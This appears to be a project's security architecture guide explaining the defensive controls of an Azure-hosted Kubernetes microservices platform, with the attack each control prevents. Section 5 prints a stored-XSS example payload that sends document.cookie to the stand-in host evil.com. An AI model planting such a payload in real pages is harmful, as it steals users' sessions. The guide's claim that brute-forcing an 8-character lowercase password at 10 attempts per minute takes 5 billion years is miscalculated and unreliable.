# 🔒 Security Architecture Guide

> This document explains every security decision made in this platform — not just *what* is configured, but *why*, and what the attack scenario is that each control prevents.

---

## Defence-in-Depth Model

This platform uses **layered security** — no single control is relied upon exclusively. Attackers must defeat multiple independent barriers to cause harm.

```
Internet
   │
   ▼
[Azure App Gateway]  ← WAF rules, TLS termination, DDoS protection
   │
   ▼
[NGINX Ingress]      ← External traffic routing, /metrics blocked externally
   │
   ▼
[API Gateway Pod]    ← JWT auth, rate limiting, header stripping, security headers
   │
   ▼
[Service Pods]       ← Object-level authorization, input validation, parameterised SQL
   │
   ▼
[PostgreSQL]         ← Private subnet only, NSG deny-all-except-5432-from-AKS
```

---

## 1. Network Security

### Virtual Network Segmentation

Resources live in isolated subnets with distinct purposes:

| Subnet | CIDR | Contains | Who can reach it |
|--------|------|----------|-----------------|
| AKS | 10.0.4.0/22 | Kubernetes nodes + pods | App Gateway (443/80) |
| Database | 10.0.8.0/24 | PostgreSQL Flexible Server | AKS subnet (5432 only) |
| App Gateway | 10.0.12.0/27 | NGINX public endpoint | Internet (443/80) |

### Network Security Groups (NSGs)

NSGs are stateful packet filters on Azure subnets. Key rules:

- **Database NSG**: Only allows port 5432 from the AKS subnet CIDR. All other inbound traffic is denied with an explicit priority-4096 deny rule. The database **has no public IP** and cannot be reached from the internet at all.
- **AKS NSG**: Only allows 443 and 80 from the App Gateway subnet.

### Kubernetes NetworkPolicies

Kubernetes-level microsegmentation *inside* the cluster. The default posture is **deny all**, then explicit allow:

| Policy | Effect |
|--------|--------|
| `default-deny-all` | Blocks all ingress and egress for every pod by default |
| `allow-dns` | Permits UDP/TCP 53 to kube-dns (required for service discovery) |
| `allow-ingress-to-api-gateway` | Only NGINX namespace pods can reach gateway:8000 |
| `allow-api-gateway-to-*` | Only gateway pod can reach backend services |
| `allow-egress-to-postgres` | Only `needs-db: "true"` pods reach DB subnet on 5432 |
| `allow-egress-to-redis` | Only `needs-cache: "true"` pods reach AKS subnet on 6380 |
| `allow-egress-to-servicebus` | Only `needs-servicebus: "true"` pods reach public 5671/443 |
| `allow-prometheus-scraping` | Monitoring namespace can scrape metrics ports |

**Why this matters**: A compromised pod cannot pivot to the database or other services. It can only send DNS queries and reach whatever its labels explicitly allow.

---

## 2. Authentication & Authorisation

### JWT Security

Tokens are issued by `user-service` and validated by the API gateway:

| Risk | Control |
|------|---------|
| Weak secret brute-force | `jwt_secret` validated for ≥32 chars and not in banned-list at startup |
| Algorithm confusion (`"none"`) | Gateway only accepts `HS256`, `HS384`, `HS512` — allowlist enforced |
| Sub claim injection | Gateway validates `sub` as a proper UUID before forwarding as `X-User-Id` |
| Expired token reuse | `exp` claim enforced by PyJWT on every decode |
| Case-sensitive "Bearer" | Middleware now case-insensitively strips the scheme prefix |

### Header Injection Prevention

The gateway maintains two frozensets of headers it controls exclusively:

```python
_HOP_BY_HOP   # Must never be forwarded (HTTP spec)
_GATEWAY_OWNED  # Gateway sets these from validated JWT/networking context
```

A client cannot spoof `X-User-Id` because the gateway strips *all* client-supplied values for gateway-owned headers and replaces them with its own validated values. This prevents **identity spoofing** — the #1 risk in any gateway/service architecture.

**New in this revision**: `X-HTTP-Method-Override`, `X-Method-Override`, and `X-HTTP-Method` are now gateway-owned and stripped. These headers allow clients to tunnel `DELETE` or `PATCH` inside a `POST` request, bypassing method-level ACLs in backends that honour them.

### Object-Level Authorisation (BOLA)

Task service enforces that callers can only access their own data:

```python
# Every operation verifies caller is creator OR assignee
where(or_(Task.creator_id == caller_id, Task.assignee_id == caller_id))
```

Without this, any authenticated user could read all tasks by omitting the project filter — a textbook Broken Object-Level Authorization (OWASP API Security #1).

---

## 3. Rate Limiting

### Why the Original Code Was Broken

The original rate limiter used `request.client.host`:

```python
# BEFORE (broken): every request through NGINX has the same "client"
client_ip = request.client.host  # → NGINX pod IP: "10.0.4.x"
```

Every user shared a single rate limit bucket because all requests came from the NGINX pod IP. One user could exhaust the limit for everyone else — a trivial denial of service.

### The Fix

```python
# AFTER: read X-Real-IP which NGINX sets to the actual client IP
real_ip = request.headers.get("x-real-ip", "").strip()
```

This is safe because our `NetworkPolicy` only allows NGINX pods to reach the gateway — no untrusted pod can spoof `X-Real-IP` by connecting directly.

### Auth Endpoint Stricter Limits

| Endpoint | Limit | Rationale |
|----------|-------|-----------|
| All endpoints | 100 req/min | General abuse prevention |
| `/api/v1/auth/login` | 10 req/min | Brute-force password prevention |
| `/api/v1/auth/register` | 10 req/min | Account creation spam prevention |

10 attempts/minute = comfortable for humans, painful for automated attacks (even at 10/min, an 8-char lowercase password space takes 5 billion years to exhaust).

---

## 4. Security Response Headers

Every response from the API gateway now includes:

| Header | Value | Protects Against |
|--------|-------|-----------------|
| `X-Content-Type-Options` | `nosniff` | MIME-type sniffing attacks |
| `X-Frame-Options` | `DENY` | Clickjacking (legacy browsers) |
| `X-XSS-Protection` | `0` | Disables broken IE XSS filter (CSP is the real defence) |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | SSL stripping / protocol downgrade |
| `Content-Security-Policy` | `default-src 'none'; frame-ancestors 'none'` | XSS, data injection, clickjacking |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Token leakage via Referer header |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()...` | XSS privilege escalation |
| `Cache-Control` | `no-store` (auth paths only) | JWT caching by proxies/browsers |

The `server` and `x-powered-by` headers are actively **removed** to reduce fingerprinting surface.

---

## 5. Input Validation & XSS Prevention

### Stored XSS in Task Fields

Task `title` and `description` fields accept arbitrary text from authenticated users. If a frontend renders them as HTML (even unintentionally via markdown), a payload like:

```html
<script>fetch('https://evil.com?c='+document.cookie)</script>
```

...executes in every user's browser who views that task.

**Fix**: Pydantic `field_validator` strips all HTML tags before storage using a strict regex. The title/description in the database can never contain `<` or `>` characters.

---

## 6. Password Security

### bcrypt Event Loop Blocking (Fixed)

bcrypt with `rounds=12` takes ~300ms of CPU per call. Originally this ran synchronously on the asyncio event loop:

```python
# BEFORE: blocks ALL concurrent requests for 300ms during login
hashed = bcrypt.hashpw(plain.encode(), bcrypt.gensalt(rounds=12))
```

Under 10 concurrent login requests, the first request blocks the event loop — all 9 others queue up waiting. At 100 req/min this creates compounding latency that cascades into timeouts.

**Fix**: `asyncio.to_thread()` offloads the blocking call to a thread-pool worker:

```python
# AFTER: runs in thread pool, event loop stays responsive
return await asyncio.to_thread(
    lambda: bcrypt.hashpw(plain.encode(), bcrypt.gensalt(rounds=12)).decode()
)
```

### Timing-Safe Rejection

When a login email doesn't exist, we still run bcrypt against a dummy hash:

```python
candidate_hash = user.hashed_password if user else _DUMMY_HASH
password_ok = await _verify_password(payload.password, candidate_hash)
```

Without this, "user not found" returns instantly while "wrong password" takes 300ms — attackers can enumerate valid accounts by measuring response times.

---

## 7. Pod Security

### Namespace-Level Enforcement (Restricted)

The `microservices` namespace enforces the Kubernetes **restricted** PodSecurity standard:

```yaml
pod-security.kubernetes.io/enforce: restricted
```

This means the API server **rejects** any pod that:
- Runs as root
- Sets `allowPrivilegeEscalation: true`
- Omits a seccomp profile
- Has write access to the root filesystem
- Retains any Linux capabilities

### Container Security Context

All containers now have:

```yaml
securityContext:
  allowPrivilegeEscalation: false  # Can't gain more privileges than parent process
  readOnlyRootFilesystem: true      # Can't write to container image layer
  capabilities:
    drop: ["ALL"]                   # All Linux kernel capabilities dropped
seccompProfile:
  type: RuntimeDefault              # Blocks dangerous syscalls (ptrace, setuid...)
```

### PodDisruptionBudgets

All four services now have PDBs with `minAvailable: 1`. During Kubernetes node drains (OS patching, cluster upgrades), Kubernetes will not evict a pod if it would leave zero replicas running. This guarantees **zero-downtime rolling maintenance**.

---

## 8. Audit Logging

Security-relevant events emit structured JSON to stdout:

```json
{"audit": true, "event_type": "login_failure", "email": "...", "client_ip": "...", "timestamp_utc": 1234567890}
```

Azure Container Insights picks these up and you can query them in Log Analytics:

```kql
// Find accounts with brute-force attempts
ContainerLog
| where LogEntry contains "\"audit\": true"
| extend entry = parse_json(LogEntry)
| where entry.event_type == "login_failure"
| summarize failures = count() by tostring(entry.email)
| where failures > 5
| order by failures desc
```

---

## 9. Database Connection Pool

Both services now set `pool_timeout=10`:

```python
engine = create_async_engine(
    async_url,
    pool_size=10,
    max_overflow=20,
    pool_timeout=10,   # Wait max 10s for a connection before raising TimeoutError
)
```

Without this, requests wait **indefinitely** for a pool connection when all 30 slots are exhausted. The HTTP client times out after 30s and reports a 504, but the database request is still hanging — creating a pile-up that gets worse over time.

---

## 10. OpenAPI Schema in Production

Both `/docs` and `/openapi.json` are disabled in production:

```python
docs_url=None,
redoc_url=None,
openapi_url=None,   # This is the critical one that was missing!
```

`/openapi.json` exposes every route path, HTTP method, request schema, and response schema — a complete API reconnaissance gift for attackers. Disabling `/docs` while leaving `/openapi.json` enabled provides zero protection.
